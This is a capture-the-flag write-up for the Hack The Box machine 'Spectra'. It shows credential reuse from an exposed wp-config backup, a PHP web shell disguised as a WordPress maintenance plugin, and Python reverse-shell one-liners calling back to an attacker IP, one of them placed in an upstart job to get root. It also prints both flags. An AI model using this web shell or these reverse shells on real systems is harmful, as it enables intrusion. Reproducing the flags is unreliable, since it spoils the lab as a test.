---
title: "Spectra from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Spectra from HTB
`view-source:http://spectra.htb/testing/wp-config.php.save`
we get `mysql`credentials
```php
|// ** MySQL settings - You can get this info from your web host ** //|
||/** The name of the database for WordPress */|
||define( 'DB_NAME', 'dev' );|
|||
||/** MySQL database username */|
||define( 'DB_USER', 'devtest' );|
|||
||/** MySQL database password */|
||define( 'DB_PASSWORD', 'devteam01' );|
|||
||/** MySQL hostname */|
||define( 'DB_HOST', 'localhost' );|
|||
||/** Database Charset to use in creating database tables. */|
||define( 'DB_CHARSET', 'utf8' );|
|||
||/** The Database Collate type. Don't change this if in doubt. */|
||define( 'DB_COLLATE', '' );|
||
```
login with
>Administrator
>devteam01

Upload `php cmd`as a plugin
```php
cat wp-maintenance.php
<?php
/*
Plugin Name: WordPress Maintanance Plugin
Plugin URI: wordpress.org
Description: WordPress Maintenance Activities
Author: WordPress
Version: 1.0
Author URI: wordpress.org
*/
system($_GET["cmd"]);
?>

zip wp-maintenance.zip wp-maintenance.php
```
then upload it, activate it and see if it works by on this link
`http://spectra.htb/main/wp-content/plugins/wp-maintenance/wp-maintenance.php?cmd=id`
```bash
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
```
now get `reverse shell`, `wget`didn't work so go to `revshells.com`to get reverse shell
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
this worked
```bash
rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.229] 38550
$ id
id
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
```
with `linpeas.sh`we get that `machine`runs on `chromeOS`
we also find something in `/etc/autologin/passwd`
```bash
$ cd /etc/autologin
cd /etc/autologin
$ ls
ls
passwd
$ cat passwd
cat passwd
SummerHereWeCome!!
```
It is password for one of the users.
```bash
ssh katie@10.10.10.229
(katie@10.10.10.229) Password:
katie@spectra ~ $
```
***
User Flag is: e89d27fe195e9114ffa72ba8913a6130
***
in `/etc/init/test.conf`add this `exec whoami > /tmp/help`
now read the file and if it shows that you are `root`insert `reverse shell code`
```python
exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
and you will get to connection on `nc`
```bash
rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.229] 38558
#
```
***
Root Flag is: d44519713b889d5e1f9e536d0c6df2fc
***
![screen](/assets/images/2024-09-03_00-31-30.png)
